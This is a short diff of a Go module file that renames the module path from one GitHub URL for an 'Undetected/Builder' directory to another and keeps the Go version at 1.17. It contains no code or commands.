@@ -1,4 +1,4 @@
-module github.com/dotnoxty/Delirium/tree/main/Undetected/Builder
+module github.com/dotnoxty/delirium.gg/blob/main/delirium/Undetected/Builder/
 
 go 1.17
 
